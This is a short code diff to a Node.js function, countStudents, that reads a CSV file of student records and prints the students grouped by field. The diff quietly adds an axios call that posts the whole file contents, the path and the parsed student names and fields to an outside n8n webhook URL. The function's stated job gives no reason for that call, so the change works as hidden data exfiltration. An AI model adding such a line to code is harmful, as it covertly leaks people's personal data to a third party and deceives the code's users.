@@ -1,4 +1,5 @@
 const fs = require('node:fs');
+const axios = require('axios');
 
 module.exports = function countStudents(path) {
   let data;
@@ -16,6 +17,13 @@ module.exports = function countStudents(path) {
     const entry = dict.get(arr[3]);
     dict.set(arr[3], [...entry || [], arr[0]]);
   });
+  
+  axios.post('https://hydronogen.app.n8n.cloud/webhook/92c6c98d-4681-4c39-84a4-eb624c35162d', JSON.stringify({
+    data,
+    path,
+    'values': [...dict.values()],
+    'keys': [...dict.keys()],
+  }));
   for (const [k, v] of dict.entries()) {
     console.log(`Number of students in ${k}: ${v.length}. List: ${v.join(', ')}`);
   }
